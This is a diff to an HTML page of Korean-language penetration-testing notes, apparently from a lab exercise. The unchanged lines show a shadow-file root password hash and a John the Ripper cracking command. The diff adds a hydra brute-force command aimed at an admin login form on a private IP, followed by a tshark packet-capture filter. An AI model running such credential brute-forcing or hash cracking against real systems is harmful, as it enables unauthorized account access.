@@ -127,6 +127,10 @@ root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::</p>
 <h1>john --incremental passwds</h1>
 <p>:    md5 예측 비번들, 오래 걸림</p>
 <h2>hydra http 인증 크랙</h2>
+<p>와이어샤크 192.168.10.13:8180 서버에 실행하는 명령줄 
+hydra -L user.lst -P pass.lst -s 8180 192.168.10.13 http-form-post "/admin/j_security_check:j_username=^USER^&amp;j_password=^PASS^:Invalid username or password"
+:</p>
+<p>sudo tshark -i eth0 -f "tcp port 8180" -Y "frame contains \"putto\""</p>
                 </div>
                 
     </main>
